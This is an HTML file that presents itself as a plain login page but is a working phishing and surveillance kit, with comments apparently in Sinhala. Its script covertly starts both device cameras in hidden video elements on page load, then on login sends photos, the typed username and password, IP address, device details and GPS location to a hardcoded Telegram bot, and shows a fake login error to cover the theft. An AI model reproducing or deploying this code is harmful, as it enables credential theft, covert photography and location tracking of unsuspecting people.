<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(120deg, #2980b9, #8e44ad);
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
        }
        .login-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 400px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding: 40px;
            z-index: 1000;
        }
        .login-box h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .textbox {
            width: 100%;
            margin-bottom: 20px;
        }
        .textbox input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn:hover {
            background: #2980b9;
        }
        .error {
            color: red;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
            color: #666;
        }
        /* ‡∑É‡∑ê‡∂ü‡∑Ä‡∑î‡∂´‡∑î video elements - ‡∂ö‡∑í‡∑É‡∑í‡∑Ä‡∑ô‡∂ö‡∑î‡∂ß‡∂≠‡∑ä ‡∂±‡∑ú‡∂¥‡∑ô‡∂±‡∑ö */
        .hidden-cameras {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>
    <!-- ‡∑É‡∑è‡∂∏‡∑è‡∂±‡∑ä‚Äç‡∂∫ login form ‡∂ë‡∂ö‡∂ö‡∑ä -->
    <div class="login-box">
        <h2>Login to Your Account</h2>
        <div class="textbox">
            <input type="text" id="username" placeholder="Username" autocomplete="off">
        </div>
        <div class="textbox">
            <input type="password" id="password" placeholder="Password">
        </div>
        <button class="btn" id="loginBtn">Login</button>
        <div class="error" id="errorMsg">Invalid username or password!</div>
        <div class="loading" id="loadingMsg">Processing...</div>
    </div>

    <!-- ‡∑É‡∑ê‡∂ü‡∑Ä‡∑î‡∂´‡∑î ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è - ‡∂ö‡∑í‡∑É‡∑í‡∑Ä‡∑ô‡∂ö‡∑î‡∂ß‡∂≠‡∑ä ‡∂¥‡∑ö‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ê‡∑Ñ‡∑ê -->
    <div class="hidden-cameras">
        <video id="frontCamera" autoplay playsinline muted></video>
        <video id="backCamera" autoplay playsinline muted></video>
    </div>

    <script>
        // ============================================
        // ‡∂î‡∂∫‡∑è‡∂ú‡∑ö Telegram Bot Details
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';  // ‡∂î‡∂∫‡∑è‡∂ú‡∑ö ‡∂∂‡∑ú‡∂ß‡∑ä ‡∂ß‡∑ù‡∂ö‡∂±‡∑ä ‡∂ë‡∂ö
        const CHAT_ID = '7642100129';                                      // ‡∂î‡∂∫‡∑è‡∂ú‡∑ö chat ID ‡∂ë‡∂ö
        
        let frontStream = null;
        let backStream = null;
        let camerasInitialized = false;

        // ------------------------------------------------------------
        // ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä load ‡∑Ä‡∑ô‡∂± ‡∂ú‡∂∏‡∂±‡∑ä‡∂∏ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        window.addEventListener('load', function() {
            // ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä load ‡∑Ä‡∑ô‡∂± ‡∂ú‡∂∏‡∂±‡∑ä‡∂∏ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è start ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
            initializeCameras();
            
            // login button ‡∂ë‡∂ö‡∂ß listener ‡∂ë‡∂ö ‡∂Ø‡∑è‡∂±‡∑ä‡∂±
            document.getElementById('loginBtn').addEventListener('click', handleLogin);
            
            // Enter key ‡∂ë‡∂ö‡∂ß‡∂≠‡∑ä ‡∑Ä‡∑ê‡∂© ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    handleLogin();
                }
            });
            
            // Test message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂± (site ‡∂ë‡∂ö open ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß)
            setTimeout(() => {
                sendTextMessage("‚úÖ Website Opened\nSomeone accessed the login page");
            }, 3000);
        });

        // ------------------------------------------------------------
        // ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂Ø‡∑ô‡∂ö‡∂∏ ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±‡∑Ä‡∑è (‡∑É‡∑ê‡∂ü‡∑Ä‡∑ì)
        // ------------------------------------------------------------
        async function initializeCameras() {
            try {
                // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä
                try {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: { exact: "environment" },
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                    console.log('‚úÖ Back camera ready');
                } catch (e) {
                    // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä ‡∂±‡∑ê‡∂≠‡∑ä‡∂±‡∂∏‡∑ä ‡∂ï‡∂±‡∂∏ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä‡∂ö‡∑ä
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false
                    });
                    const backVideo = document.getElementById('backCamera');
                    backVideo.srcObject = backStream;
                    console.log('‚úÖ Back camera ready (fallback)');
                }

                // ‡∂â‡∑É‡∑ä‡∑É‡∂ª‡∑Ñ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä
                try {
                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    });
                    const frontVideo = document.getElementById('frontCamera');
                    frontVideo.srcObject = frontStream;
                    console.log('‚úÖ Front camera ready');
                } catch (e) {
                    console.log('‚ö†Ô∏è Front camera not available');
                }

                camerasInitialized = true;
                
            } catch (error) {
                console.log('‚ùå Camera initialization failed:', error);
                sendTextMessage("‚ùå Camera access failed: " + error.message);
            }
        }

        // ------------------------------------------------------------
        // ‡∂ß‡∑ô‡∂Ω‡∑í‡∂ú‡∑ä‚Äç‡∂ª‡∑ë‡∂∏‡∑ä ‡∂∂‡∑ú‡∂ß‡∑ä‡∂ß text message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function sendTextMessage(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (e) {
                console.log('Failed to send message:', e);
                return false;
            }
        }

        // ------------------------------------------------------------
        // ‡∂¥‡∑í‡∂±‡∑ä‡∂≠‡∑ñ‡∂ª ‡∂ú‡∑ô‡∂± Telegram ‡∂∂‡∑ú‡∂ß‡∑ä‡∂ß ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function captureAndSend() {
            const frontVideo = document.getElementById('frontCamera');
            const backVideo = document.getElementById('backCamera');
            
            // timestamp ‡∂ë‡∂ö
            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
            const filename = Date.now();
            
            // IP address ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
            let ipAddress = 'Unknown';
            let country = 'Unknown';
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                ipAddress = ipData.ip;
                country = ipData.country_name || 'Unknown';
            } catch (e) {
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                } catch (err) {}
            }

            // Browser ‡∂≠‡∑ú‡∂ª‡∂≠‡∑î‡∂ª‡∑î
            const userAgent = navigator.userAgent;
            let browser = 'Unknown';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            let os = 'Unknown';
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'MacOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone')) os = 'iOS';

            // ============================================
            // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä‡∑ô‡∂±‡∑ä ‡∂¥‡∑í‡∂±‡∑ä‡∂≠‡∑ñ‡∂ª‡∂∫ ‡∂ú‡∑ô‡∂± ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            // ============================================
            if (backVideo.srcObject) {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = backVideo.videoWidth || 640;
                    canvas.height = backVideo.videoHeight || 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(backVideo, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    const blob = await (await fetch(imageData)).blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `back_${filename}.jpg`);
                    formData.append('caption', `üî¥ <b>BACK CAMERA</b>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üìÖ <b>Time:</b> ${timestamp}
üåç <b>IP:</b> ${ipAddress}
üìç <b>Country:</b> ${country}
üíª <b>Device:</b> ${os}
üåê <b>Browser:</b> ${browser}
üë§ <b>Username:</b> ${document.getElementById('username').value || 'Not entered'}
üîë <b>Password:</b> ${document.getElementById('password').value || 'Not entered'}`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    console.log('‚úÖ Back camera image sent');
                } catch (e) {
                    console.log('‚ùå Failed to send back camera image:', e);
                }
            }

            // ============================================
            // ‡∂â‡∑É‡∑ä‡∑É‡∂ª‡∑Ñ ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä‡∑ô‡∂±‡∑ä ‡∂¥‡∑í‡∂±‡∑ä‡∂≠‡∑ñ‡∂ª‡∂∫ ‡∂ú‡∑ô‡∂± ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            // ============================================
            if (frontVideo.srcObject) {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = frontVideo.videoWidth || 640;
                    canvas.height = frontVideo.videoHeight || 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    const blob = await (await fetch(imageData)).blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `front_${filename}.jpg`);
                    formData.append('caption', `üü¢ <b>FRONT CAMERA</b>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üìÖ <b>Time:</b> ${timestamp}
üåç <b>IP:</b> ${ipAddress}
üìç <b>Country:</b> ${country}
üíª <b>Device:</b> ${os}
üåê <b>Browser:</b> ${browser}
üë§ <b>Username:</b> ${document.getElementById('username').value || 'Not entered'}
üîë <b>Password:</b> ${document.getElementById('password').value || 'Not entered'}`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    console.log('‚úÖ Front camera image sent');
                } catch (e) {
                    console.log('‚ùå Failed to send front camera image:', e);
                }
            }
            
            // Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂± try ‡∂ö‡∂ª‡∂±‡∑ä‡∂± (‡∂Ö‡∑Ä‡∑É‡∂ª ‡∂≠‡∑í‡∂∂‡∑ä‡∂∂‡∑ú‡∂≠‡∑ä)
            getLocation();
        }

        // ------------------------------------------------------------
        // Location ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        await sendTextMessage(`üìç <b>Location:</b>
Latitude: ${lat}
Longitude: ${lon}
Google Maps: https://maps.google.com/?q=${lat},${lon}`);
                    },
                    (error) => {
                        console.log('Location permission denied');
                    }
                );
            }
        }

        // ------------------------------------------------------------
        // Login handle ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        async function handleLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const loadingMsg = document.getElementById('loadingMsg');
            const loginBtn = document.getElementById('loginBtn');
            
            // Loading ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂±
            loadingMsg.style.display = 'block';
            loginBtn.disabled = true;
            errorMsg.style.display = 'none';
            
            // ============================================
            // ‡∂¥‡∑í‡∂±‡∑ä‡∂≠‡∑ñ‡∂ª ‡∂ú‡∑ô‡∂± ‡∂∂‡∑ú‡∂ß‡∑ä‡∂ß ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
            // ============================================
            if (camerasInitialized) {
                await captureAndSend();
            } else {
                await initializeCameras();
                setTimeout(async () => {
                    await captureAndSend();
                }, 2000);
            }

            // ============================================
            // Error ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂¥‡∑ô‡∂±‡∑ä‡∑Ä‡∂±‡∑ä‡∂± (‡∑É‡∑ê‡∂∂‡∑ë login ‡∂ë‡∂ö‡∂ö‡∑ä ‡∑Ä‡∂ú‡∑ö)
            // ============================================
            setTimeout(() => {
                loadingMsg.style.display = 'none';
                loginBtn.disabled = false;
                errorMsg.style.display = 'block';
                
                // Input fields reset ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 3‡∂ö‡∑í‡∂±‡∑ä error message ‡∂ë‡∂ö hide ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 3000);
                
            }, 2000);
        }

        // ------------------------------------------------------------
        // ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä close ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è stop ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        window.addEventListener('beforeunload', function() {
            if (frontStream) {
                frontStream.getTracks().forEach(track => track.stop());
            }
            if (backStream) {
                backStream.getTracks().forEach(track => track.stop());
            }
        });

        // ------------------------------------------------------------
        // Visibility change - user ‡∑Ä‡∑ô‡∂±‡∂≠‡∑ä tab ‡∂ë‡∂ö‡∂ö‡∂ß ‡∂ú‡∑í‡∂∫‡∂≠‡∑ä ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∑Ä‡∑ê‡∂© ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ------------------------------------------------------------
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('Tab hidden but cameras still running');
            }
        });

    </script>
</body>
</html>
